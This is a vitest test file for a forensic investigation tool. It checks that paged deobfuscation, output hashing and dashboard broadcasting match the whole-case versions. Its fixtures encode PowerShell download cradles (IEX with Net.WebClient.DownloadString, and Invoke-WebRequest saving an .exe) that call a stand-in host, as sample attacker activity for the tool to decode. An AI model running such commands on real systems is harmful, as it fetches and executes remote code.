import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { emptyState, type ForensicEvent, type InvestigationState } from "../../src/analysis/stateTypes.js";
import { applyDeobfuscation } from "../../src/analysis/applyDeobfuscation.js";
import { deobfuscateRows } from "../../src/composition/deobfuscationRows.js";
import { investigationOutput, investigationOutputStreamed } from "../../src/analysis/analysisRunSnapshot.js";
import { createStateBroadcaster } from "../../src/composition/stateBroadcast.js";

// #1874: the per-import sweeps that used to load (and save) the whole case now read it a page at a
// time and write only what they change. Each must give exactly what the whole-case version gave.

function psEnc(plaintext: string): string {
  return `powershell.exe -NoProfile -enc ${Buffer.from(plaintext, "utf16le").toString("base64")}`;
}

function ev(id: string, description: string, p: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id,
    timestamp: `2026-01-0${1 + (Number(id.replace(/\D/g, "")) % 9)}T00:00:00Z`,
    description,
    severity: "Medium",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...p,
  };
}

let dir: string;
let store: StateStore;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "dfir-sweeps-"));
  const cases = new CaseStore(dir);
  await cases.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  store = new StateStore(cases);
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe("deobfuscateRows (#1874)", () => {
  it("decodes, numbers IOCs and prunes orphans exactly as the whole-case pass", async () => {
    // One event decoded earlier (its IOC referenced), one plain, two to decode now — one of which
    // names the IOC the earlier result already added.
    const first = applyDeobfuscation({
      ...emptyState("c1"),
      iocs: [{ id: "i001", type: "ip", value: "203.0.113.1" } as never],
      forensicTimeline: [
        ev("e1", psEnc("IEX (New-Object Net.WebClient).DownloadString('http://a.example.com/x')")),
      ],
    }).state;
    const seeded: InvestigationState = {
      ...first,
      forensicTimeline: [
        ...first.forensicTimeline,
        ev("e2", "svchost.exe started"),
        ev("e3", psEnc("Invoke-WebRequest http://a.example.com/x -OutFile c:\\t.exe")),
        ev("e4", psEnc("Write-Host 'hello'")),
      ],
    };
    await store.save(seeded);
    const loaded = await store.load("c1");
    const reference = applyDeobfuscation(loaded);
    expect(reference.deobfuscated).toBe(2);
    const outcome = await deobfuscateRows(store, "c1", {});
    expect(outcome).toEqual({
      deobfuscated: reference.deobfuscated,
      newIocs: reference.newIocs,
      reanalyzed: reference.reanalyzed,
      changed: true,
    });
    const after = await store.load("c1");
    expect(after.iocs).toEqual(reference.state.iocs);
    expect(after.forensicTimeline.map((e) => e.deobfuscated)).toEqual(
      reference.state.forensicTimeline.map((e) => e.deobfuscated),
    );
    // A second run finds nothing to do and writes nothing.
    expect((await deobfuscateRows(store, "c1", {})).changed).toBe(false);
  });
});

describe("investigationOutputStreamed (#1874)", () => {
  it("hashes the same bytes as investigationOutput over the whole case", async () => {
    const state: InvestigationState = {
      ...emptyState("c1"),
      findings: [
        { id: "f1", title: "t", severity: "High", description: "d", relatedEventIds: ["e2"] } as never,
      ],
      iocs: [{ id: "i1", type: "ip", value: "203.0.113.9", zeta: { b: 1, a: [2, { d: 1, c: 2 }] } } as never],
      forensicTimeline: Array.from({ length: 1203 }, (_, i) =>
        ev(`e${i}`, `row ${i}`, { canonical: undefined, sha256: i % 7 ? undefined : "ab".repeat(32) }),
      ),
    };
    await store.save(state);
    const full = await store.load("c1");
    const streamed = await investigationOutputStreamed(
      await store.loadOverview("c1"),
      store.forensicTimelineBatches("c1"),
    );
    expect(streamed).toEqual(investigationOutput(full));
  });
});

describe("createStateBroadcaster (#1874)", () => {
  it("loads the case only when a dashboard watches it, and coalesces a burst into one more load", async () => {
    let watching = false;
    let release: () => void = () => {};
    const load = vi.fn(() => new Promise<InvestigationState>((r) => (release = () => r(emptyState("c1")))));
    const broadcast = vi.fn();
    const announce = createStateBroadcaster({ load, broadcast, hasSubscribers: () => watching });
    announce("c1");
    await Promise.resolve();
    expect(load).not.toHaveBeenCalled();
    watching = true;
    announce("c1");
    await vi.waitFor(() => expect(load).toHaveBeenCalledTimes(1));
    announce("c1");
    announce("c1");
    release();
    await vi.waitFor(() => expect(load).toHaveBeenCalledTimes(2));
    release();
    await vi.waitFor(() => expect(broadcast).toHaveBeenCalledTimes(2));
  });
});
